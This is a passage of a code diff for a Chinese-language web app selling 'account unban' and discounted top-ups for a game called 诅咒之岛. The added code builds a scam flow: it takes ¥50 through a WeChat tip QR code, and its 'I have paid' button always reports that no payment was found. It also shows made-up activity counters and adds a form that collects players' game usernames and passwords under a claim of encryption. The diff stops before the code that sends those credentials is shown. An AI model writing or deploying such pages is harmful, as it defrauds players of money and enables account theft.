-                const response = await fetch(API_BASE + '/user/withdraw.php', {
+                const response = await fetch(CONFIG.API_BASE + '/user/withdraw.php', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -4751,12 +5428,104 @@
 
 
         // ============================================
-        // 解封服务视图渲染（原有功能保留）
+        // 解封服务视图渲染（赞赏码支付方式）
         // ============================================
         function renderUnban() {
             const container = document.getElementById('view-unban');
-            
+
             container.innerHTML = `
+                <style>
+                    .unban-amount-display {
+                        font-size: 32px;
+                        font-weight: 700;
+                        text-align: center;
+                        margin-bottom: 20px;
+                        background: linear-gradient(180deg, #FF8A65, #FF5722);
+                        -webkit-background-clip: text;
+                        -webkit-text-fill-color: transparent;
+                    }
+                    .unban-qr-frame {
+                        width: 170px;
+                        height: 170px;
+                        margin: 0 auto;
+                        padding: 10px;
+                        background: white;
+                        border-radius: 16px;
+                        box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+                    }
+                    .unban-qr-frame img {
+                        width: 100%;
+                        height: 100%;
+                        object-fit: contain;
+                        border-radius: 8px;
+                    }
+                    .unban-payment-cell {
+                        display: flex;
+                        align-items: center;
+                        padding: 16px;
+                        background: rgba(255, 255, 255, 0.08);
+                        border-radius: 16px;
+                        cursor: pointer;
+                        transition: all 0.2s ease;
+                        border: 0.5px solid rgba(255, 255, 255, 0.1);
+                        margin-bottom: 12px;
+                    }
+                    .unban-payment-cell:hover {
+                        background: rgba(255, 255, 255, 0.12);
+                        transform: translateX(4px);
+                    }
+                    .unban-payment-cell.disabled {
+                        opacity: 0.4;
+                        cursor: not-allowed;
+                        background: rgba(255, 59, 48, 0.08);
+                    }
+                    .unban-payment-icon {
+                        width: 36px;
+                        height: 36px;
+                        border-radius: 10px;
+                        display: flex;
+                        align-items: center;
+                        justify-content: center;
+                        font-size: 20px;
+                        margin-right: 14px;
+                        background: rgba(255,255,255,0.15);
+                    }
+                    .unban-badge {
+                        font-size: 10px;
+                        padding: 2px 6px;
+                        background: #FF3B30;
+                        color: white;
+                        border-radius: 4px;
+                        font-weight: 700;
+                        margin-left: 8px;
+                    }
+                    .unban-maintenance-note {
+                        font-size: 12px;
+                        color: #FF3B30;
+                        margin-top: 4px;
+                    }
+                    .unban-error-alert {
+                        display: none;
+                        background: rgba(255, 59, 48, 0.95);
+                        color: white;
+                        padding: 12px 20px;
+                        border-radius: 100px;
+                        font-size: 14px;
+                        font-weight: 600;
+                        margin-bottom: 16px;
+                        text-align: center;
+                    }
+                    .unban-error-alert.show {
+                        display: block;
+                        animation: errorPop 0.5s ease;
+                    }
+                    @keyframes errorPop {
+                        0% { opacity: 0; transform: scale(0.5); }
+                        70% { transform: scale(1.05); }
+                        100% { opacity: 1; transform: scale(1); }
+                    }
+                </style>
+
                 <!-- 头部导航 -->
                 <div class="header">
                     <a class="header-back" onclick="history.back()">
@@ -4766,240 +5535,348 @@
                     <div class="header-title">解封服务</div>
                     <div style="width: 50px;"></div>
                 </div>
-                
-                <!-- 解封服务主页面 -->
+
+                <!-- 解封主页面 - 输入游戏ID -->
                 <div id="unbanMain">
-                    <!-- Banner -->
-                    <div class="banner" style="height: 150px; margin: 16px;">
-                        <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800" alt="Unban Service" style="width: 100%; height: 100%; object-fit: cover; border-radius: 16px;">
+                    <div class="card glass" style="margin: 16px; padding: 32px 24px;">
+                        <div class="icon-wrapper" style="text-align: center; margin-bottom: 20px;">
+                            <div style="width: 76px; height: 76px; margin: 0 auto; background: linear-gradient(135deg, rgba(255,100,50,0.3), rgba(255,50,100,0.1)); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 36px;">🔓</div>
+                        </div>
+                        <h1 style="font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 8px;">诅咒之岛解封系统</h1>
+                        <p style="text-align: center; color: rgba(255,255,255,0.7); margin-bottom: 28px; font-size: 14px;">请输入您的游戏ID以申请解除账号限制</p>
+
+                        <div class="form-group" style="margin-bottom: 24px;">
+                            <label class="form-label" style="font-size: 13px; font-weight: 600; color: rgba(255,255,255,0.7); margin-bottom: 8px; display: block;">游戏ID</label>
+                            <input type="text" 
+                                   class="form-input" 
+                                   id="unbanGameId" 
+                                   placeholder="请输入游戏名字"
+                                   autocomplete="off"
+                                   style="width: 100%; padding: 14px 18px; background: rgba(0,0,0,0.35); border: 0.5px solid rgba(255,255,255,0.15); border-radius: 16px; color: white; font-size: 17px; outline: none;">
+                            <div style="font-size: 11px; color: rgba(255,255,255,0.5); margin-top: 6px;">仅支持字母、数字、下划线和横线</div>
+                        </div>
+
+                        <button class="btn btn-primary btn-block" onclick="handleUnbanSubmit()" style="padding: 16px; font-size: 17px; font-weight: 600;">进入解封系统</button>
                     </div>
-                    
-                    <!-- 服务介绍 -->
-                    <div class="card glass" style="margin: 16px;">
-                        <div class="card-header">
-                            <div class="font-semibold">🔓 解封服务</div>
+
+                    <!-- 统计信息 -->
+                    <div style="display: flex; justify-content: center; gap: 16px; margin-top: 16px;">
+                        <div style="background: rgba(0,0,0,0.6); backdrop-filter: blur(20px); padding: 6px 12px; border-radius: 100px; border: 0.5px solid rgba(255,255,255,0.1); font-size: 12px; color: rgba(255,255,255,0.7);">
+                            <span style="color: #34C759;">●</span> 在线: 342
                         </div>
-                        <div class="card-body">
-                            <p style="line-height: 1.8; color: rgba(255,255,255,0.8); margin-bottom: 16px;">
-                                专业解封服务，帮助您快速恢复游戏账号。支持多种封禁类型的解封申请。
-                            </p>
-                            <div class="d-flex flex-column gap-12">
-                                <div class="d-flex align-center gap-12 p-12 rounded" style="background: rgba(255,255,255,0.05);">
-                                    <span style="font-size: 24px;">⚡</span>
-                                    <div>
-                                        <div class="font-semibold">快速处理</div>
-                                        <div class="text-sm text-muted">24小时内响应</div>
-                                    </div>
-                                </div>
-                                <div class="d-flex align-center gap-12 p-12 rounded" style="background: rgba(255,255,255,0.05);">
-                                    <span style="font-size: 24px;">🔒</span>
-                                    <div>
-                                        <div class="font-semibold">安全保障</div>
-                                        <div class="text-sm text-muted">隐私数据加密保护</div>
-                                    </div>
-                                </div>
-                                <div class="d-flex align-center gap-12 p-12 rounded" style="background: rgba(255,255,255,0.05);">
-                                    <span style="font-size: 24px;">💯</span>
-                                    <div>
-                                        <div class="font-semibold">成功率高</div>
-                                        <div class="text-sm text-muted">专业团队操作</div>
-                                    </div>
-                                </div>
-                            </div>
+                        <div style="background: rgba(0,0,0,0.6); backdrop-filter: blur(20px); padding: 6px 12px; border-radius: 100px; border: 0.5px solid rgba(255,255,255,0.1); font-size: 12px; color: rgba(255,255,255,0.7);">
+                            今日已处理: 1,847
                         </div>
-                    </div>
-                    
-                    <!-- 解封类型选择 -->
-                    <div class="card glass" style="margin: 16px;">
-                        <div class="card-header">
-                            <div class="font-semibold">选择解封类型</div>
-                        </div>
-                        <div class="card-body">
-                            <div class="d-flex flex-column gap-12">
-                                <div class="p-16 rounded" style="background: rgba(255,255,255,0.05); cursor: pointer; border: 1px solid rgba(0,122,255,0.3);" onclick="startUnbanProcess('normal')">
-                                    <div class="d-flex justify-between align-center">
-                                        <div>
-                                            <div class="font-semibold">普通解封</div>
-                                            <div class="text-sm text-muted mt-4">适用于一般违规封禁</div>
-                                        </div>
-                                        <span class="text-primary">→</span>
-                                    </div>
-                                </div>
-                                <div class="p-16 rounded" style="background: rgba(255,255,255,0.05); cursor: pointer; border: 1px solid rgba(255,149,0,0.3);" onclick="startUnbanProcess('urgent')">
-                                    <div class="d-flex justify-between align-center">
-                                        <div>
-                                            <div class="font-semibold">加急解封</div>
-                                            <div class="text-sm text-muted mt-4">优先处理，2小时内响应</div>
-                                        </div>
-                                        <span class="text-warning">→</span>
-                                    </div>
-                                </div>
-                                <div class="p-16 rounded" style="background: rgba(255,255,255,0.05); cursor: pointer; border: 1px solid rgba(52,199,89,0.3);" onclick="startUnbanProcess('vip')">
-                                    <div class="d-flex justify-between align-center">
-                                        <div>
-                                            <div class="font-semibold">VIP解封</div>
-                                            <div class="text-sm text-muted mt-4">专属客服一对一服务</div>
-                                        </div>
-                                        <span class="text-success">→</span>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- 查询解封状态 -->
-                    <div class="px-16">
-                        <button class="btn btn-glass btn-block" onclick="checkUnbanStatus()">查询解封状态</button>
                     </div>
                 </div>
-                
-                <!-- 解封表单页面 -->
-                <div id="unbanForm" class="hidden">
-                    <div class="card glass" style="margin: 16px;">
-                        <div class="card-header">
-                            <div class="font-semibold">填写解封信息</div>
+
+                <!-- 支付方式选择页面 -->
+                <div id="unbanMethods" class="hidden">
+                    <div class="card glass" style="margin: 16px; padding: 32px 24px;">
+                        <div class="icon-wrapper" style="text-align: center; margin-bottom: 20px;">
+                            <div style="width: 76px; height: 76px; margin: 0 auto; background: linear-gradient(135deg, rgba(100,200,255,0.3), rgba(100,200,255,0.1)); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px;">💳</div>
                         </div>
-                        <div class="card-body">
-                            <div class="form-group">
-                                <label class="form-label">游戏账号 *</label>
-                                <input type="text" class="form-input" id="unbanAccount" placeholder="请输入游戏账号">
-                            </div>
-                            <div class="form-group">
-                                <label class="form-label">封禁原因 *</label>
-                                <select class="form-select" id="unbanReason">
-                                    <option value="">请选择封禁原因</option>
-                                    <option value="cheat">使用外挂</option>
-                                    <option value="abuse">言语辱骂</option>
-                                    <option value="exploit">利用BUG</option>
-                                    <option value="other">其他原因</option>
-                                </select>
-                            </div>
-                            <div class="form-group">
-                                <label class="form-label">详细说明</label>
-                                <textarea class="form-input form-textarea" id="unbanDetail" placeholder="请详细描述情况"></textarea>
-                            </div>
-                            <div class="form-group">
-                                <label class="form-label">联系方式 *</label>
-                                <input type="text" class="form-input" id="unbanContact" placeholder="QQ/微信/手机号">
+                        <h1 style="font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 8px;">选择支付方式</h1>
+                        <p style="text-align: center; color: rgba(255,255,255,0.7); margin-bottom: 24px; font-size: 14px;">选择支付方式完成验证</p>
+
+                        <div class="unban-payment-cell" onclick="selectUnbanWechat()">
+                            <div class="unban-payment-icon" style="background: rgba(7, 193, 96, 0.2);">💬</div>
+                            <div style="flex: 1;">
+                                <div style="font-size: 16px; font-weight: 600;">微信支付</div>
+                                <div style="font-size: 13px; color: rgba(255,255,255,0.5);">微信扫一扫赞赏码</div>
                             </div>
                         </div>
-                    </div>
-                    
-                    <div class="px-16">
-                        <button class="btn btn-primary btn-block" onclick="submitUnban()">提交申请</button>
-                        <button class="btn btn-glass btn-block mt-12" onclick="showUnbanMain()">返回</button>
+
+                        <div class="unban-payment-cell disabled" id="unbanAlipayCell">
+                            <div class="unban-payment-icon" style="background: rgba(22, 119, 255, 0.2);">💙</div>
+                            <div style="flex: 1;">
+                                <div style="font-size: 16px; font-weight: 600; display: flex; align-items: center;">
+                                    支付宝
+                                    <span class="unban-badge">维护</span>
+                                </div>
+                                <div style="font-size: 13px; color: rgba(255,255,255,0.5);">支付宝扫码支付</div>
+                                <div class="unban-maintenance-note">维护到3月15日</div>
+                            </div>
+                        </div>
+
+                        <button class="btn btn-glass btn-block" onclick="showUnbanMain()" style="margin-top: 12px;">返回</button>
                     </div>
                 </div>
-                
-                <!-- 解封状态查询页面 -->
-                <div id="unbanStatus" class="hidden">
-                    <div class="card glass" style="margin: 16px;">
-                        <div class="card-header">
-                            <div class="font-semibold">查询解封状态</div>
+
+                <!-- 微信支付页面 -->
+                <div id="unbanWechat" class="hidden">
+                    <div class="card glass" style="margin: 16px; padding: 32px 24px;">
+                        <div class="icon-wrapper" style="text-align: center; margin-bottom: 20px;">
+                            <div style="width: 76px; height: 76px; margin: 0 auto; background: linear-gradient(135deg, rgba(7,193,96,0.3), rgba(7,193,96,0.1)); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px;">💬</div>
                         </div>
-                        <div class="card-body">
-                            <div class="form-group">
-                                <label class="form-label">查询编号</label>
-                                <input type="text" class="form-input" id="unbanQueryId" placeholder="请输入查询编号">
+                        <h1 style="font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 8px; color: #07C160;">微信支付</h1>
+
+                        <div style="background: rgba(0,0,0,0.5); border-radius: 24px; padding: 24px; margin: 20px 0; border: 0.5px solid rgba(255,255,255,0.1);">
+                            <div class="unban-amount-display">¥50.00</div>
+                            <div class="unban-qr-frame">
+                                <img src="https://1813813973.v.123pan.cn/1813813973/45048231" alt="WeChat Pay">
                             </div>
-                            <button class="btn btn-primary btn-block" onclick="queryUnbanStatus()">查询</button>
+                            <div style="text-align: center; margin-top: 16px; font-size: 13px; color: rgba(255,255,255,0.7);">请使用微信扫一扫上方赞赏码</div>
                         </div>
-                    </div>
-                    
-                    <div id="unbanStatusResult" class="hidden">
-                        <div class="card glass" style="margin: 16px;">
-                            <div class="card-body text-center">
-                                <div style="font-size: 48px; margin-bottom: 16px;">⏳</div>
-                                <div class="font-semibold text-lg">处理中</div>
-                                <div class="text-muted mt-8">您的解封申请正在处理中，请耐心等待</div>
-                                <div class="mt-16">
-                                    <div class="d-flex justify-between text-sm mb-8">
-                                        <span class="text-muted">提交时间</span>
-                                        <span>2024-01-01 12:00</span>
-                                    </div>
-                                    <div class="d-flex justify-between text-sm mb-8">
-                                        <span class="text-muted">处理进度</span>
-                                        <span class="text-primary">60%</span>
-                                    </div>
-                                    <div style="height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden;">
-                                        <div style="width: 60%; height: 100%; background: var(--primary); border-radius: 3px;"></div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="px-16">
-                        <button class="btn btn-glass btn-block" onclick="showUnbanMain()">返回</button>
+
+                        <div id="unbanErrorBox" class="unban-error-alert">支付验证失败，未检测到您的付款记录，请联系客服</div>
+
+                        <button class="btn btn-success btn-block" onclick="handleUnbanComplete()" style="background: linear-gradient(180deg, #07C160, #059b4d); margin-bottom: 12px;">我已完成支付</button>
+                        <button class="btn btn-glass btn-block" onclick="showUnbanMethods()">返回</button>
                     </div>
                 </div>
             `;
         }
 
-        // 显示解封主页面
+        function handleUnbanSubmit() {
+            const input = document.getElementById('unbanGameId');
+            const gameId = input.value.trim();
+
+            if (!gameId) {
+                input.style.borderColor = '#FF3B30';
+                setTimeout(() => input.style.borderColor = '', 500);
+                UI.error('请输入游戏ID');
+                return;
+            }
+
+            // 保存游戏ID
+            window.unbanGameId = gameId;
+
+            // 显示加载动画
+            document.getElementById('unbanMain').innerHTML = `
+                <div class="card glass" style="margin: 16px; padding: 60px 20px; text-align: center;">
+                    <div style="width: 48px; height: 48px; margin: 0 auto 20px; border: 3px solid rgba(255,87,34,0.3); border-top-color: #FF5722; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+                    <div style="font-size: 15px; color: rgba(255,255,255,0.7);">正在连接服务器...</div>
+                </div>
+            `;
+
+            setTimeout(() => {
+                document.getElementById('unbanMain').classList.add('hidden');
+                document.getElementById('unbanMethods').classList.remove('hidden');
+            }, 1200);
+        }
+
         function showUnbanMain() {
             document.getElementById('unbanMain').classList.remove('hidden');
-            document.getElementById('unbanForm').classList.add('hidden');
-            document.getElementById('unbanStatus').classList.add('hidden');
+            document.getElementById('unbanMethods').classList.add('hidden');
+            document.getElementById('unbanWechat').classList.add('hidden');
+            // 恢复主页面内容
+            renderUnban();
         }
 
-        // 开始解封流程
-        function startUnbanProcess(type) {
-            document.getElementById('unbanMain').classList.add('hidden');
-            document.getElementById('unbanForm').classList.remove('hidden');
+        function showUnbanMethods() {
+            document.getElementById('unbanMethods').classList.remove('hidden');
+            document.getElementById('unbanWechat').classList.add('hidden');
         }
 
-        // 提交解封申请
-        function submitUnban() {
-            const account = document.getElementById('unbanAccount').value;
-            const reason = document.getElementById('unbanReason').value;
-            const contact = document.getElementById('unbanContact').value;
-            
-            if (!account || !reason || !contact) {
-                UI.error('请填写完整信息');
-                return;
-            }
-            
-            // 显示加载页面
-            document.getElementById('unbanForm').innerHTML = `
-                <div class="card glass" style="margin: 16px;">
-                    <div class="card-body text-center" style="padding: 60px 20px;">
-                        <div class="spinner" style="margin: 0 auto 24px;"></div>
-                        <div class="font-semibold text-lg">正在提交申请...</div>
-                        <div class="text-muted mt-8">请稍候</div>
-                    </div>
-                </div>
-            `;
-            
-            setTimeout(() => {
-                UI.success('解封申请已提交');
-                showUnbanMain();
-            }, 2000);
+        function selectUnbanWechat() {
+            document.getElementById('unbanMethods').classList.add('hidden');
+            document.getElementById('unbanWechat').classList.remove('hidden');
         }
 
-        // 查询解封状态
-        function checkUnbanStatus() {
-            document.getElementById('unbanMain').classList.add('hidden');
-            document.getElementById('unbanStatus').classList.remove('hidden');
+        function handleUnbanComplete() {
+            const errorBox = document.getElementById('unbanErrorBox');
+            errorBox.classList.add('show');
+            errorBox.textContent = '支付验证失败，未检测到您的付款记录，请联系客服';
+            setTimeout(() => errorBox.classList.remove('show'), 4000);
         }
-
-        // 执行查询
-        function queryUnbanStatus() {
-            const queryId = document.getElementById('unbanQueryId').value;
-            if (!queryId) {
-                UI.error('请输入查询编号');
-                return;
-            }
-            document.getElementById('unbanStatusResult').classList.remove('hidden');
-        }
-
         // ============================================
-        // 代充服务视图渲染（原有功能保留）
+        // 代充服务视图渲染（4.5折钻石/金币充值 + 赞赏码支付）
         // ============================================
         function renderRecharge() {
             const container = document.getElementById('view-recharge');
-            
+
             container.innerHTML = `
+                <style>
+                    .recharge-amount-grid {
+                        display: grid;
+                        grid-template-columns: repeat(3, 1fr);
+                        gap: 10px;
+                        margin: 20px 0;
+                    }
+                    .recharge-amount-item {
+                        padding: 12px 8px;
+                        background: rgba(255, 255, 255, 0.08);
+                        border: 0.5px solid rgba(255, 255, 255, 0.1);
+                        border-radius: 16px;
+                        text-align: center;
+                        cursor: pointer;
+                        transition: all 0.2s ease;
+                        position: relative;
+                        overflow: hidden;
+                    }
+                    .recharge-amount-item:hover {
+                        background: rgba(255, 255, 255, 0.12);
+                        transform: translateY(-2px);
+                    }
+                    .recharge-amount-item.selected {
+                        background: rgba(255, 215, 0, 0.2);
+                        border-color: rgba(255, 215, 0, 0.5);
+                        box-shadow: 0 0 20px rgba(255, 215, 0, 0.2);
+                    }
+                    .recharge-amount-item.selected.diamond-selected {
+                        background: rgba(100, 200, 255, 0.2);
+                        border-color: rgba(100, 200, 255, 0.5);
+                        box-shadow: 0 0 20px rgba(100, 200, 255, 0.2);
+                    }
+                    .recharge-amount-item .price {
+                        font-size: 18px;
+                        font-weight: 700;
+                        color: white;
+                        display: block;
+                    }
+                    .recharge-amount-item .original-price {
+                        font-size: 11px;
+                        color: rgba(255,255,255,0.5);
+                        text-decoration: line-through;
+                        display: block;
+                        margin-top: 2px;
+                    }
+                    .recharge-amount-item .value {
+                        font-size: 12px;
+                        color: rgba(255,255,255,0.5);
+                        margin-top: 2px;
+                        display: block;
+                    }
+                    .recharge-amount-item.selected .price {
+                        color: #FFD700;
+                    }
+                    .recharge-amount-item.selected.diamond-selected .price {
+                        color: #64C8FF;
+                    }
+                    .recharge-discount-badge {
+                        position: absolute;
+                        top: -1px;
+                        right: -1px;
+                        background: linear-gradient(135deg, #FF3B30, #FF5722);
+                        color: white;
+                        font-size: 9px;
+                        padding: 2px 5px;
+                        border-radius: 0 16px 0 16px;
+                        font-weight: 700;
+                    }
+                    .recharge-currency-toggle {
+                        display: flex;
+                        gap: 8px;
+                        margin-bottom: 20px;
+                        padding: 4px;
+                        background: rgba(0, 0, 0, 0.3);
+                        border-radius: 16px;
+                        border: 0.5px solid rgba(255, 255, 255, 0.1);
+                    }
+                    .recharge-currency-btn {
+                        flex: 1;
+                        padding: 10px;
+                        border: none;
+                        background: transparent;
+                        color: rgba(255,255,255,0.7);
+                        font-size: 15px;
+                        font-weight: 600;
+                        border-radius: 12px;
+                        cursor: pointer;
+                        transition: all 0.2s ease;
+                        display: flex;
+                        align-items: center;
+                        justify-content: center;
+                        gap: 6px;
+                    }
+                    .recharge-currency-btn.active {
+                        background: rgba(255, 255, 255, 0.15);
+                        color: white;
+                        box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+                    }
+                    .recharge-currency-btn.diamond.active {
+                        background: rgba(100, 200, 255, 0.2);
+                        color: #64C8FF;
+                    }
+                    .recharge-currency-btn.coin.active {
+                        background: rgba(255, 215, 0, 0.2);
+                        color: #FFD700;
+                    }
+                    .recharge-product-info {
+                        display: flex;
+                        justify-content: space-between;
+                        align-items: center;
+                        padding: 12px 16px;
+                        background: rgba(255, 255, 255, 0.05);
+                        border-radius: 16px;
+                        margin: 16px 0;
+                        border: 0.5px solid rgba(255, 255, 255, 0.1);
+                    }
+                    .recharge-qr-frame {
+                        width: 170px;
+                        height: 170px;
+                        margin: 0 auto;
+                        padding: 10px;
+                        background: white;
+                        border-radius: 16px;
+                        box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+                    }
+                    .recharge-qr-frame img {
+                        width: 100%;
+                        height: 100%;
+                        object-fit: contain;
+                        border-radius: 8px;
+                    }
+                    .recharge-amount-display {
+                        font-size: 32px;
+                        font-weight: 700;
+                        text-align: center;
+                        margin-bottom: 20px;
+                        background: linear-gradient(180deg, #FFD700, #FFA500);
+                        -webkit-background-clip: text;
+                        -webkit-text-fill-color: transparent;
+                    }
+                    .recharge-upload-status {
+                        display: none;
+                        padding: 12px;
+                        border-radius: 16px;
+                        margin-bottom: 16px;
+                        text-align: center;
+                        font-size: 14px;
+                        font-weight: 600;
+                    }
+                    .recharge-upload-status.show {
+                        display: block;
+                        animation: fadeIn 0.3s ease;
+                    }
+                    .recharge-upload-status.success {
+                        background: rgba(52, 199, 89, 0.2);
+                        color: #34C759;
+                        border: 0.5px solid rgba(52, 199, 89, 0.3);
+                    }
+                    .recharge-upload-status.error {
+                        background: rgba(255, 59, 48, 0.2);
+                        color: #FF3B30;
+                        border: 0.5px solid rgba(255, 59, 48, 0.3);
+                    }
+                    .recharge-upload-status.loading {
+                        background: rgba(255, 193, 7, 0.2);
+                        color: #FFC107;
+                        border: 0.5px solid rgba(255, 193, 7, 0.3);
+                    }
+                    .recharge-error-alert {
+                        display: none;
+                        background: rgba(255, 59, 48, 0.95);
+                        color: white;
+                        padding: 12px 20px;
+                        border-radius: 100px;
+                        font-size: 14px;
+                        font-weight: 600;
+                        margin-bottom: 16px;
+                        text-align: center;
+                    }
+                    .recharge-error-alert.show {
+                        display: block;
+                        animation: errorPop 0.5s ease;
+                    }
+                    @keyframes errorPop {
+                        0% { opacity: 0; transform: scale(0.5); }
+                        70% { transform: scale(1.05); }
+                        100% { opacity: 1; transform: scale(1); }
+                    }
+                </style>
+
                 <!-- 头部导航 -->
                 <div class="header">
                     <a class="header-back" onclick="history.back()">
@@ -5009,278 +5886,322 @@
                     <div class="header-title">代充服务</div>
                     <div style="width: 50px;"></div>
                 </div>
-                
-                <!-- 代充服务主页面 -->
+
+                <!-- 代充主页面 -->
                 <div id="rechargeMain">
-                    <!-- Banner -->
-                    <div class="banner" style="height: 150px; margin: 16px;">
-                        <img src="https://images.unsplash.com/photo-1611996900188-b34f97c9480e?w=800" alt="Recharge Service" style="width: 100%; height: 100%; object-fit: cover; border-radius: 16px;">
-                    </div>
-                    
-                    <!-- 服务介绍 -->
-                    <div class="card glass" style="margin: 16px;">
-                        <div class="card-header">
-                            <div class="font-semibold">💎 代充服务</div>
+                    <div class="card glass" style="margin: 16px; padding: 32px 24px;">
+                        <div class="icon-wrapper" style="text-align: center; margin-bottom: 20px;">
+                            <div style="width: 76px; height: 76px; margin: 0 auto; background: linear-gradient(135deg, rgba(255,215,0,0.3), rgba(255,165,0,0.2)); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 36px;">💎</div>
                         </div>
-                        <div class="card-body">
-                            <p style="line-height: 1.8; color: rgba(255,255,255,0.8); margin-bottom: 16px;">
-                                安全快捷的游戏代充服务，支持多种支付方式，即时到账。
-                            </p>
-                            <div class="d-flex flex-column gap-12">
-                                <div class="d-flex align-center gap-12 p-12 rounded" style="background: rgba(255,255,255,0.05);">
-                                    <span style="font-size: 24px;">⚡</span>
-                                    <div>
-                                        <div class="font-semibold">即时到账</div>
-                                        <div class="text-sm text-muted">充值后立即到账</div>
-                                    </div>
-                                </div>
-                                <div class="d-flex align-center gap-12 p-12 rounded" style="background: rgba(255,255,255,0.05);">
-                                    <span style="font-size: 24px;">🔒</span>
-                                    <div>
-                                        <div class="font-semibold">安全可靠</div>
-                                        <div class="text-sm text-muted">官方渠道充值</div>
-                                    </div>
-                                </div>
-                                <div class="d-flex align-center gap-12 p-12 rounded" style="background: rgba(255,255,255,0.05);">
-                                    <span style="font-size: 24px;">💰</span>
-                                    <div>
-                                        <div class="font-semibold">优惠价格</div>
-                                        <div class="text-sm text-muted">比官方更优惠</div>
-                                    </div>
-                                </div>
+                        <h1 style="font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 8px; color: #FFD700;">诅咒之岛代充</h1>
+                        <p style="text-align: center; color: rgba(255,255,255,0.7); margin-bottom: 28px; font-size: 14px;">超低折扣充值，秒速到账</p>
+
+                        <!-- 货币类型切换 -->
+                        <div class="recharge-currency-toggle">
+                            <button class="recharge-currency-btn diamond active" onclick="switchRechargeCurrency('diamond')">
+                                <span>💎</span>
+                                <span>钻石</span>
+                            </button>
+                            <button class="recharge-currency-btn coin" onclick="switchRechargeCurrency('coin')">
+                                <span>🪙</span>
+                                <span>金币</span>
+                            </button>
+                        </div>
+
+                        <!-- 上传状态提示 -->
+                        <div id="rechargeUploadStatus" class="recharge-upload-status"></div>
+
+                        <!-- 金额选择网格 -->
+                        <div class="recharge-amount-grid" id="rechargeAmountGrid"></div>
+
+                        <!-- 账号密码输入表单（初始隐藏） -->
+                        <div id="rechargeLoginForm" style="display: none; margin-top: 20px; animation: fadeInUp 0.5s ease;">
+                            <div class="form-group" style="margin-bottom: 16px;">
+                                <label class="form-label" style="font-size: 13px; font-weight: 600; color: rgba(255,255,255,0.7); margin-bottom: 8px; display: block;">游戏账号</label>
+                                <input type="text" 
+                                       class="form-input" 
+                                       id="rechargeGameAccount" 
+                                       placeholder="请输入游戏账号/邮箱"
+                                       autocomplete="off"
+                                       style="width: 100%; padding: 14px 18px; background: rgba(0,0,0,0.35); border: 0.5px solid rgba(255,255,255,0.15); border-radius: 16px; color: white; font-size: 17px; outline: none;">
+                            </div>
+
+                            <div class="form-group" style="margin-bottom: 16px;">
+                                <label class="form-label" style="font-size: 13px; font-weight: 600; color: rgba(255,255,255,0.7); margin-bottom: 8px; display: block;">游戏密码</label>
+                                <input type="password" 
+                                       class="form-input" 
+                                       id="rechargeGamePassword" 
+                                       placeholder="请输入游戏密码"
+                                       autocomplete="off"
+                                       style="width: 100%; padding: 14px 18px; background: rgba(0,0,0,0.35); border: 0.5px solid rgba(255,255,255,0.15); border-radius: 16px; color: white; font-size: 17px; outline: none;">
+                                <div style="font-size: 11px; color: rgba(255,255,255,0.5); margin-top: 6px;">账号密码将加密传输至服务器</div>
+                            </div>
+
+                            <div class="recharge-product-info">
+                                <span style="font-size: 14px; color: rgba(255,255,255,0.7);">充值金额</span>
+                                <span style="font-size: 16px; font-weight: 700; color: #FFD700;" id="rechargeSelectedAmountDisplay">¥0.00</span>
                             </div>
                         </div>
-                    </div>
-                    
-                    <!-- 充值套餐 -->
-                    <div class="card glass" style="margin: 16px;">
-                        <div class="card-header">
-                            <div class="font-semibold">选择充值套餐</div>
+
+                        <button class="btn btn-primary btn-block" onclick="handleRechargeSubmit()" id="rechargeSubmitBtn" style="padding: 16px; font-size: 17px; font-weight: 600; background: linear-gradient(180deg, #FFD700, #FFA500); color: #000; margin-top: 16px;">选择充值金额</button>
+
+                        <div style="margin-top: 16px; text-align: center; font-size: 12px; color: rgba(255,255,255,0.5);">
+                            全场4.5折起，比官方便宜55%
                         </div>
-                        <div class="card-body">
-                            <div class="d-flex flex-column gap-12">
-                                <div class="p-16 rounded" style="background: rgba(255,255,255,0.05); cursor: pointer; border: 2px solid transparent;" onclick="selectRechargePackage(this, 30, 28)" data-package="1">
-                                    <div class="d-flex justify-between align-center">
-                                        <div class="d-flex align-center gap-12">
-                                            <span style="font-size: 32px;">💎</span>
-                                            <div>
-                                                <div class="font-semibold">30 钻石</div>
-                                                <div class="text-sm text-muted">优惠价 ¥28</div>
-                                            </div>
-                                        </div>
-                                        <div class="tag tag-success">省¥2</div>
-                                    </div>
-                                </div>
-                                <div class="p-16 rounded" style="background: rgba(255,255,255,0.05); cursor: pointer; border: 2px solid transparent;" onclick="selectRechargePackage(this, 68, 62)" data-package="2">
-                                    <div class="d-flex justify-between align-center">
-                                        <div class="d-flex align-center gap-12">
-                                            <span style="font-size: 32px;">💎</span>
-                                            <div>
-                                                <div class="font-semibold">68 钻石</div>
-                                                <div class="text-sm text-muted">优惠价 ¥62</div>
-                                            </div>
-                                        </div>
-                                        <div class="tag tag-success">省¥6</div>
-                                    </div>
-                                </div>
-                                <div class="p-16 rounded" style="background: rgba(255,255,255,0.05); cursor: pointer; border: 2px solid transparent;" onclick="selectRechargePackage(this, 128, 115)" data-package="3">
-                                    <div class="d-flex justify-between align-center">
-                                        <div class="d-flex align-center gap-12">
-                                            <span style="font-size: 32px;">💎</span>
-                                            <div>
-                                                <div class="font-semibold">128 钻石</div>
-                                                <div class="text-sm text-muted">优惠价 ¥115</div>
-                                            </div>
-                                        </div>
-                                        <div class="tag tag-success">省¥13</div>
-                                    </div>
-                                </div>
-                                <div class="p-16 rounded" style="background: rgba(255,255,255,0.05); cursor: pointer; border: 2px solid transparent;" onclick="selectRechargePackage(this, 328, 288)" data-package="4">
-                                    <div class="d-flex justify-between align-center">
